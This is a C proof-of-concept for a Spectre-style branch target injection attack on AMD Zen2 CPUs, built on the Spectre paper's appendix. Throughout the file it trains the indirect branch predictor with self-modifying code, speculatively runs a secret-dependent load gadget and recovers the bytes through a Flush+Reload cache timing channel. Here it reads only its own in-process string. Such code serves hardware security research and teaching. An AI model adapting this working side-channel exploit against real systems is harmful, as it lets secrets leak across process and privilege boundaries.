/* This dummy PoC is tested on an AMD Threadripper Zen2
 * and builds on the Spectre v1 PoC written in the
 * Appendix C of the Spectre paper in
 * https://spectreattack.com/spectre.pdf
 */

/* Required for CPU affinity functions */
#define _GNU_SOURCE
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

#include <sys/mman.h>
#include <unistd.h>

enum training_mode {
  TRAIN,
  ATTACK,
};

#define RET 0xC3

/* The rdtscp in itself takes about 60 cycles on Zen2 */
#define CACHE_HIT_THRESHOLD 80
/* Covert channel */
#define ELEMENT_PADDING (512)
/* The number of characters in the ASCII space */
#define NUM_ELEMENTS 256
uint8_t covert_channel[NUM_ELEMENTS * ELEMENT_PADDING];

char *secret = "L Lag gaye";

void indirect_call(void **pointer_to_target, void *leak_addr,
                   void *covert_channel) {

  __asm__ volatile(
      /* Move the value of 'secret' into register RDI (first argument). */
      "mov %[leak_addr], %%rdi\n"
      /* Move the value of 'covert_channel' into register RSI (second argument).
       */
      "mov %[covert_channel], %%rsi\n"
      /* Invalidate the cache line containing the address pointed to by
       * `pointer_to_target`.
       */
      "clflush (%[pointer_to_target])\n"
      /* Load the value at the address pointed to by `pointer_to_target` into
       * register RAX.
       */
      "mov (%[pointer_to_target]), %%rax\n"
      /* Indirectly call the function whose address is stored in RAX. */
      "call *(%%rax)\n"
      : /* No output operands */
      : [pointer_to_target] "r"(pointer_to_target), [leak_addr] "r"(leak_addr),
        [covert_channel] "r"(covert_channel)
      : "rax", "rdi", "rsi");
}

void malicious_target(void *leak_addr, void *covert_channel) {
  /* A dependant load where the index into the covert channel is dependant on
   * the secret. This code is only executed speculatively, the infinite loop
   * ensures the speculation lasts the whole window and repeatedly updates the
   * covert channel.
   */
  __asm__ volatile(
      /* Label for the infinite loop (executed only speculatively) */
      "1:\n"
      /* Move a byte from the address pointed to by 'secret_ptr' into EAX
       * zero-extending it.
       */
      "movzxb (%[leak_addr]), %%eax\n"
      /* Shift the value in RAX left by 9 bits (multiply by 512). */
      "shl $9, %%rax\n"
      /* Add the value of 'covert_channel_ptr' to RAX. */
      "add %[covert_channel], %%rax\n"
      /* Move the value at the address pointed to by RAX into RBX. */
      "movq (%%rax), %%rbx\n"
      /* Jump back to label '1' (creating an infinite loop). */
      "jmp 1b\n"
      : /* No output operands */
      : [leak_addr] "r"(leak_addr), [covert_channel] "r"(covert_channel)
      : "rax", "rbx");
}



void benign_target(void *a, void *b) {}

void flush_covert_channel() {
  for (int i = 0; i < NUM_ELEMENTS; i++)
    _mm_clflush(&covert_channel[i * ELEMENT_PADDING]);
}

void do_bti_and_read_byte(char *secret_addr, char secret_value[2],
                          int score[2]) {
  volatile int result;
  int hits[NUM_ELEMENTS];
  int winner, runner_up;

  enum training_mode training_sequence[6] = {TRAIN, TRAIN, TRAIN,
                                             TRAIN, TRAIN, ATTACK};
  uint8_t saved_first_byte_malicious_target = *(uint8_t *)(malicious_target);
  void (*target)(void *, void *) = NULL;
  void *pointer_to_target = (void *)(&target);

  for (int i = 0; i < NUM_ELEMENTS; i++) {
    hits[i] = 0;
    covert_channel[i * ELEMENT_PADDING] = 0;
  }

  for (int iter = 0; iter < 1000; iter++) {
    /* Clear the cache so that a hit in the covert channel is
     * can be measured as a side channel.
     */
    flush_covert_channel();

    for (int i = 0; i < 6; i++) {
      if (training_sequence[i] == ATTACK) {
        /* Here, the benign target is executed speculatively, but the BPU is
         * trained to speculate to malicious_target So, the RET instructionis
         * changed back to the original byte so that the secret dependent load
         * can be executed speculatively.
         */
        *(uint8_t *)(malicious_target) = saved_first_byte_malicious_target;
        target = benign_target;
      } else {
        /* During the training phase, `malicious_target` is executed
         * architecturally, so the first byte is replaced with a `RET`.
         */
        *(uint8_t *)(malicious_target) = RET;
        target = malicious_target;
      }
      indirect_call(&pointer_to_target, secret_addr, covert_channel);
    }

    for (int i = 0; i < NUM_ELEMENTS; i++) {
      uint64_t start, elapsed;
      int mix_i;
      uint8_t *addr;
      /* This trick of mixing the indices to evade stride prediction
       * as mentioned in the example in Appendix C.
       */
      mix_i = ((i * 167) + 13) & 255;
      addr = &covert_channel[mix_i * ELEMENT_PADDING];
      start = __rdtsc();
      /* result needs to be volatile so that it does not get optimized away */
      result = *addr;
      /* Wait for the load to finish */
      _mm_mfence();
      elapsed = __rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }

    winner = -1, runner_up = -1;
    for (int i = 0; i < NUM_ELEMENTS; i++) {
      if (winner < 0 || hits[i] >= hits[winner]) {
        runner_up = winner;
        winner = i;
      } else if (runner_up < 0 || hits[i] >= hits[runner_up]) {
        runner_up = i;
      }
    }
    if ((hits[winner] >= 2 * hits[runner_up] + 5) ||
        (hits[winner] == 2 && hits[runner_up] == 0)) {
      break;
    }
  }

  secret_value[0] = (char)winner;
  score[0] = hits[winner];
  secret_value[1] = (char)runner_up;
  score[1] = hits[runner_up];
  /* use the result, __maybe_unused could be added as well */
  result++;
}

void set_cpu_affinity(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  sched_setaffinity(0, sizeof(set), &set);
}

int make_target_writeable(void *malicious_target) {
  long page_size = sysconf(_SC_PAGESIZE);
  if (page_size == -1) {
    perror("sysconf(_SC_PAGESIZE)");
    return -1;
  }

  /* TODO: Using 64 as a best guess as 64 is the size of the cache line,
   * mprotect may just mark the whole page as writeable.
   */
  void *aligned_target = (void *)((long)malicious_target & (~(page_size - 1)));

  if (mprotect(aligned_target, 64, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
    perror("mprotect");
    return -1;
  }

  return 0;
}

int main() {
  /* Pin to CPU 0 */
  set_cpu_affinity(0);

  char result[2];
  int score[2];
  int probe_len = strlen(secret);
  char *probe_addr = secret;

  if (make_target_writeable(malicious_target) != 0) {
    printf(
        "Unable to change permissions (mprotect(RWX)) of the malicious target");
  }
  printf("Reading %d bytes starting at %p:\n", probe_len, probe_addr);
  while (--probe_len >= 0) {
    printf("reading %p...", probe_addr);
    do_bti_and_read_byte(probe_addr++, result, score);
    printf("%s: (hits=%d vs %d)",
           (score[0] > 0 && score[0] >= 2 * score[1] ? "success" : "unclear"),
           score[0], score[1]);
    printf("0x%02X='%c'\n", result[0],
           (result[0] > 31 && result[0] < 127 ? result[0] : '?'));
  }
  printf("\n");
}